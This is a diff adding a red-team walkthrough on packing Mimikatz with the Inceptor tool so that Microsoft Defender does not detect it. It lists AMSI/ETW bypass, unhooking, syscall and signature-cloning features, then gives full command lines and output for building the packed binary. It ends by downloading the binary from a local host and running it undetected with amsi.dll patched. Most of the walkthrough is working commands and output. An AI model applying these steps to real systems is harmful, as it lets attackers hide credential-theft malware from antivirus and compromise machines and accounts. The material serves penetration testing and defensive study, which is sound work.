@@ -1,0 +1,342 @@
+===============================================================================================================================
+Antivirus/EDR bypass using the packer 'Inceptor'
+===============================================================================================================================
+
+Inceptor is a template-based PE packer for Windows, designed to help penetration testers and red teamers to bypass common AV and EDR solutions. 
+Inceptor has been designed with a focus on usability, and to allow extensive user customisation.
+
+=> https://github.com/klezVirus/inceptor
+=> https://klezvirus.github.io/RedTeaming/AV_Evasion/CodeExeNewDotNet/
+
+Inceptor has many features:
+
+1. AV Evasion Mechanisms
+-------------------------
+Inceptor natively implements AV Evasion mechanisms, and as such, it offers the possibility to include AV evasion features to the payload
+in the form of "modules" (plugins) which can be embedded:
+> AMSI bypass
+> WLDP bypass
+> ETW bypass
+> Sandbox (Behavioural) Deception
+
+2. EDR Evasion Mechanisms
+--------------------------
+Inceptor also implements EDR Evasion mechanisms, such as full unhooking, direct syscall invocation and manual DLL mapping. 
+Direct Syscalls are implemented in C# using the outstanding "DInvoke" project, again by TheWover. 
+In C/C++, Syscalls are implemented using SysWhispers and SysWhispers2 projects, by Jackson_T. 
+In addition, Inceptor has built-in support for x86 Syscalls as well.
+
+As the AV bypass features, these features can be enabled as modules, with the only difference that they require operating on a template which supports them. The techniques implemented so far are:
+> Full Unhooking
+> Manual DLL Mapping
+> Direct Syscalls
+
+3. Encryption, Compression and Encoding
+----------------------------------------
+Inceptor can encode, compress, or encrypt shellcode using different means. 
+> Native 	 Xor, Nop (Insertion)
+> .NET		 Hex, Base64, Xor, Nop (Insertion), AES, Zlib, RLE
+> PowerShell 	 Hex, Base64, Xor, Nop (Insertion), AES
+
+4. Code Obfuscation
+--------------------
+Inceptor supports payload obfuscation by using external utils, such as ConfuserEx and Chameleon, and provides support for C/C++ obfuscation 
+using LLVM-Obfuscator, which is an IR-based obfuscator using the LLVM compilation platform.
+> PowerShell
+> C#
+> C/C++
+
+5. Code Signing
+----------------
+Another feature of Inceptor is that it can code sign the resulting binary/dll by using the tool CarbonCopy Usually, files signed with 
+code signing certificates are less strictly analysed. Many anti-malware products don't validate/verify these certificates.
+
+
+========================================================================================================================================
+PoC / Example 1 - Running a packed version of Mimikatz.exe on a Windows server 2016 without being detected by the Microsoft Defender AV
+========================================================================================================================================
+
+---------------------------------------------------------------------------
+Step 1 - Install the tool "Inceptor" on a Windows 10 Laptop
+---------------------------------------------------------------------------
+
+Microsoft Windows [Version 10.0.19044.2364]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>cd Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main>pip install --use-pep517 pyinstaller
+Collecting pyinstaller
+  Using cached pyinstaller-5.7.0-py3-none-win_amd64.whl (1.3 MB)
+Requirement already satisfied: pywin32-ctypes>=0.2.0 in c:\users\administrator\appdata\local\packages\pythonsoftwarefoundation.python.3.10_qbz5n2kfra8p0\localcache\local-packages\python310\site-packages (from pyinstaller) (0.2.0)
+Requirement already satisfied: pyinstaller-hooks-contrib>=2021.4 in c:\users\administrator\appdata\local\packages\pythonsoftwarefoundation.python.3.10_qbz5n2kfra8p0\localcache\local-packages\python310\site-packages (from pyinstaller) (2022.14)
+Requirement already satisfied: altgraph in c:\users\administrator\appdata\local\packages\pythonsoftwarefoundation.python.3.10_qbz5n2kfra8p0\localcache\local-packages\python310\site-packages (from pyinstaller) (0.17.3)
+Requirement already satisfied: setuptools>=42.0.0 in c:\program files\windowsapps\pythonsoftwarefoundation.python.3.10_3.10.2544.0_x64__qbz5n2kfra8p0\lib\site-packages (from pyinstaller) (65.5.0)
+Collecting pefile>=2022.5.30
+  Using cached pefile-2022.5.30.tar.gz (72 kB)
+  Installing build dependencies ... done
+  Getting requirements to build wheel ... done
+  Preparing metadata (pyproject.toml) ... done
+Collecting future
+<SNIP>
+
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main>pip install -r requirements.txt
+Collecting frida
+  Downloading frida-16.0.8-cp37-abi3-win_amd64.whl (30.7 MB)
+     ---------------------------------------- 30.7/30.7 MB 6.7 MB/s eta 0:00:00
+Collecting frida-tools
+  Downloading frida-tools-12.0.4.tar.gz (177 kB)
+     ---------------------------------------- 177.6/177.6 kB 973.1 kB/s eta 0:00:00
+  Installing build dependencies ... done
+  Getting requirements to build wheel ... done
+<SNIP>
+ 
+
+=> Note: To fix that an error that I encountered, I modified the line "python3 -m PyInstaller --onefile inceptor\inceptor.py" and added in my path Python3
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main>type build.bat
+@echo off
+pip install pyinstaller
+python3 -m PyInstaller --onefile inceptor\inceptor.py
+del inceptor.spec > NUL
+del /S /Q /F build > NUL
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main>build.bat
+Requirement already satisfied: pyinstaller in c:\users\administrator\appdata\local\packages\pythonsoftwarefoundation.python.3.10_qbz5n2kfra8p0\localcache\local-packages\python310\site-packages (5.7.0)
+Requirement already satisfied: altgraph in c:\users\administrator\appdata\local\packages\pythonsoftwarefoundation.python.3.10_qbz5n2kfra8p0\localcache\local-packages\python310\site-packages (from pyinstaller) (0.17.3)
+Requirement already satisfied: pefile>=2022.5.30 in c:\users\administrator\appdata\local\packages\pythonsoftwarefoundation.python.3.10_qbz5n2kfra8p0\localcache\local-packages\python310\site-packages (from pyinstaller) (2022.5.30)
+Requirement already satisfied: pyinstaller-hooks-contrib>=2021.4 in c:\users\administrator\appdata\local\packages\pythonsoftwarefoundation.python.3.10_qbz5n2kfra8p0\localcache\local-packages\python310\site-packages (from pyinstaller) (2022.14)
+Requirement already satisfied: setuptools>=42.0.0 in c:\program files\windowsapps\pythonsoftwarefoundation.python.3.10_3.10.2544.0_x64__qbz5n2kfra8p0\lib\site-packages (from pyinstaller) (65.5.0)
+Requirement already satisfied: pywin32-ctypes>=0.2.0 in c:\users\administrator\appdata\local\packages\pythonsoftwarefoundation.python.3.10_qbz5n2kfra8p0\localcache\local-packages\python310\site-packages (from pyinstaller) (0.2.0)
+Requirement already satisfied: future in c:\users\administrator\appdata\local\packages\pythonsoftwarefoundation.python.3.10_qbz5n2kfra8p0\localcache\local-packages\python310\site-packages (from pefile>=2022.5.30->pyinstaller) (0.18.2)
+357 INFO: PyInstaller: 5.7.0
+357 INFO: Python: 3.10.9
+<SNIP>
+38765 INFO: Fixing EXE headers
+39001 INFO: Building EXE from EXE-00.toc completed successfully.
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main>
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\inceptor>python3 update-config.py
+[*] Identified multiple VS Installations
+[*] Choose the Visual Studio Version:
+  0: C:\Program Files (x86)\Microsoft Visual Studio\2017\
+  1: C:\Program Files (x86)\Microsoft Visual Studio\2019\
+  2: C:\Program Files\Microsoft Visual Studio\2022\
+> 2
+C:\Program Files\Microsoft Visual Studio\2022\
+[*] Checking requirements
+[+] .NET Framework is installed
+[*] Checking Windows Build Tools
+  [+] Located MSBUILD.EXE (32-bit) at C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe
+  [+] Located MSBUILD.EXE (64-bit) at C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\amd64\MSBuild.exe
+[+] Setting COMPILERS.MSBUILDx86_COMPILER to C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\amd64\MSBuild.exe
+[+] Setting COMPILERS.MSBUILDx64_COMPILER to C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe
+[-] Windows Clang compiler not installed. Opening Microsoft Download site...
+[*] Checking LLVM Obfuscate Toolchains
+[-] LLVM was not found on the system, do you want to download the static binaries?
+[Y|N] > Y
+[+] Downloading LLVM, the process may take minutes (~500MB)
+  [*] Fetching LLVM-Obfuscator ...
+  [+] Download complete, saved as C:\Users\ADMINI~1.PO7\AppData\Local\Temp\tmpp3du1b0e.7z
+[+] Unpacking downloaded file into C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\inceptor\obfuscators\native\llvm-clang
+[*] Checking LLVM Obfuscate Toolchains
+  [+] Located CLANG.EXE (LLVM-Obfuscate) at obfuscators\native\llvm-clang\llvm-clang\clang-cl.exe
+[*] Checking Windows Code Signing Tools
+  [+] Located signtool x64 utility at C:\Program Files (x86)\Windows Kits\10\bin\10.0.19041.0\x64\signtool.exe
+  [+] Located signtool x86 utility at C:\Program Files (x86)\Windows Kits\10\bin\10.0.19041.0\x86\signtool.exe
+  [+] Located signtool x64 utility at C:\Program Files (x86)\Windows Kits\10\bin\10.0.20348.0\x64\signtool.exe
+  [+] Located signtool x86 utility at C:\Program Files (x86)\Windows Kits\10\bin\10.0.20348.0\x86\signtool.exe
+[*] Choose a version for signtool_x86:
+  0: C:\Program Files (x86)\Windows Kits\10\bin\10.0.19041.0\x86\signtool.exe
+  1: C:\Program Files (x86)\Windows Kits\10\bin\10.0.20348.0\x86\signtool.exe
+> 1
+[*] Choose a version for signtool_x64:
+  0: C:\Program Files (x86)\Windows Kits\10\bin\10.0.19041.0\x64\signtool.exe
+  1: C:\Program Files (x86)\Windows Kits\10\bin\10.0.20348.0\x64\signtool.exe
+> 1
+[+] Windows Signing Tools installed
+[*] Checking Dumpbin
+[-] Windows Dumpbin not installed
+[*] Which logo would you like to see?
+[*] Which logo would you like to see?
+  0: No logo
+  1: Name-only logo
+  2: Not-so-cool logo
+  3: Original logo
+  > 0
+[+] Finished!
+
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\inceptor>python3 inceptor.py -h
+Traceback (most recent call last):
+  File "C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\inceptor\inceptor.py", line 13, in <module>
+    from generators.PowerShellArtifactGenerator import PowerShellArtifactGenerator
+<SNIP>
+    from obfuscators.powershell.chameleon.chameleon import Chameleon
+ModuleNotFoundError: No module named 'obfuscators.powershell.chameleon.chameleon'
+
+=> To fix that error, I donwoaded the project "chameleon" from Github and add it in the folder 'inceptor-main\inceptor\obfuscators\powershell\chameleon'.
+
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\inceptor>python3 inceptor.py -h
+
+usage: inceptor.py [-h] [-hh] [--list-modules] [-Z] {native,dotnet,powershell} ...
+
+inceptor: A Windows-based PE Packing framework designed to help
+          Red Team Operators to bypass common AV and EDR solutions
+
+positional arguments:
+  {native,dotnet,powershell}
+    native              Native Artifacts Generator
+    dotnet              .NET Artifacts Generator
+    powershell          PowerShell Artifacts Generator
+
+options:
+  -h, --help            show this help message and exit
+  -hh                   Show functional table
+  --list-modules        Show loadable modules
+  -Z, --check           Check file against DefenderCheck
+
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\inceptor>python3 inceptor.py --list-modules
+
+  - amsi
+  - anti_debug
+  - delay
+  - dinvoke
+  - dtjs
+  - eval_args
+  - find_process
+  - hardcoded_args
+  - static_args
+  - syscalls
+  - unhook
+  
+  
+-----------------------------------------------------------------------------------------------------------------------------
+Step 2 - Use the tool "Inceptor" to create a packed version of Mimikatz.exe
+-----------------------------------------------------------------------------------------------------------------------------
+
+usage: inceptor.py 	  [-h] [-t {loader,donut,pe2sh,srdi}] [-m MODULES] [-O] [-P] [-P0 PROCESS] [-e ENCODER] [-a COMPILER_ARGS] [-C {csc}] [-p PARAMS]
+                          [--classname CLASSNAME] [--function FUNCTION] [--arch {x86,x64,anycpu,anycpu-x86,anycpu-x64}] [--sgn] [-s] [-so] [-ss SIGN_STEAL]
+                          [-sd SIGN_DOMAIN] -o OUTFILE [--clone CLONE] [--delay DELAY] [-hw]
+                          binary
+
+C:\Users\Administrator.PO718687\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\inceptor>python3 inceptor.py dotnet -t donut C:\temp\mimikatz.exe 
+--outfile C:\temp\Inceptor-Mimi1.exe --sgn --sign --module amsi --module anti_debug --arch x64 --delay 120
+
+[*] Multiple compatible templates identified, choose one:
+  0: classic.cs
+  1: service.cs
+  $> 0
+[DEBUG] Loading module Delay
+[DEBUG] Loading module AntiDebug
+[DEBUG] Loading module AmsiBypass
+[+] .Net Artifact Generator Started At 2022-12-28 04:19:20.974718
+[*] Phase 0: Loading...
+[*] Phase 1: Converting binary into shellcode
+  [>] Transformer: Donut
+[*] Phase 2: Encoding
+  [>] Phase 2.1: Using Shikata-Ga-Nai x64 to encode the shellcode
+    [*] Encoded filename: C:\Users\Administrator.PO718687\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\inceptor\temp\tmpobg1w48v.raw.sgn
+  [>] Phase 2.2: Using Inceptor chained encoder to encode the shellcode
+  [>] Encoder Chain: HexEncoder
+  [>] Shellcode size: 2741914
+  [>] Shellcode Signature: ca4e16d6c196948c0d93edb75c05e9e5ee934cc8
+[*] Phase 3: Generating source files using CLASSIC
+  [>] Phase 3.1: Writing CS file in .\temp\tmp4hj4r56o.cs
+  [>] Phase 3.2: Compiling and linking dependency files in "tmpcbfgy9ts.dll","tmp3bfzc3r_.dll"
+[*] Phase 4: Compiling
+[*] Phase 5: Merging Resources
+  [+] Success: packed file stored at C:\Users\Administrator.PO718687\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\inceptor\temp\Inceptor-Mimi-temp.exe
+  [+] File Signature: a48308879052846a08a08633818301e01b513649
+[*] Phase 6: Sign dotnet binary
+  [+] Signed with: CarbonCopy
+[*] Phase 7: Finalising
+  [+] Success: file stored at C:\temp\Inceptor-Mimi.exe
+[*] Phase 8: Cleaning up
+[+] .Net Artifact Generator Finished At 2022-12-28 04:19:25.105320
+
+
+Other examples: python3 inceptor.py dotnet -t donut C:\temp\mimikatz.exe --outfile C:\temp\Inceptor-Mimi2.exe --sgn --sign --module amsi --encoder aes --arch x64 --delay 120
+
+
+------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Download and execute the packed version of Mimikatz.exe on a Windows server 2016 without being detected by the Defender AV
+         which is enabled and up-to-date
+------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\temp> Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntispywareSignatureLastUpdated,AntivirusSignatureLastUpdated  | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+AntispywareSignatureLastUpdated : 12/30/2022 8:02:22 AM
+AntivirusSignatureLastUpdated   : 12/30/2022 8:02:21 AM
+
+
+PS C:\temp> wget -URI http://192.168.1.30:8080/Inceptor-Mimi.exe -OutFile Inceptor-Mimi.exe
+
+PS C:\temp> cmd
+
+Microsoft Windows [Version 10.0.19044.2364]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\temp> Inceptor-Mimi.exe
+
+[GetOSThreads]: thread.Id 100C
+[GetOSThreads]: thread.Id 100C hidden from debbuger.
+[GetOSThreads]: thread.Id 11C
+[GetOSThreads]: thread.Id 11C hidden from debbuger.
+[GetOSThreads]: thread.Id 1308
+[GetOSThreads]: thread.Id 1308 hidden from debbuger.
+[GetOSThreads]: thread.Id E28
+[GetOSThreads]: thread.Id E28 hidden from debbuger.
+[GetOSThreads]: thread.Id CC4
+[GetOSThreads]: thread.Id CC4 hidden from debbuger.
+[GetOSThreads]: thread.Id 3F4
+[GetOSThreads]: skipped thread.Id 3F4
+[+] Success. amsi.dll Patched!
+[*] Restoring memory protection...
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+  
+mimikatz #
+mimikatz # coffee
+
+    ( (
+     ) )
+  .______.
+  |      |]
+  \      /
+   `----'
+
+mimikatz # help
+ERROR mimikatz_doLocal ; "help" command of "standard" module not found !
+
+Module :        standard
+Full name :     Standard module
+Description :   Basic commands (does not require module name)
+
+            exit  -  Quit mimikatz
+             cls  -  Clear screen (doesn't work with redirections, like PsExec)
+          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
+          coffee  -  Please, make me a coffee!
+           sleep  -  Sleep an amount of milliseconds
+             log  -  Log mimikatz input/output to file
+          base64  -  Switch file input/output base64
+         version  -  Display some version informations
+              cd  -  Change or display current directory
+       localtime  -  Displays system local date and time (OJ command)
+        hostname  -  Displays system local hostname
+
+mimikatz #
+mimikatz # exit
+Bye!
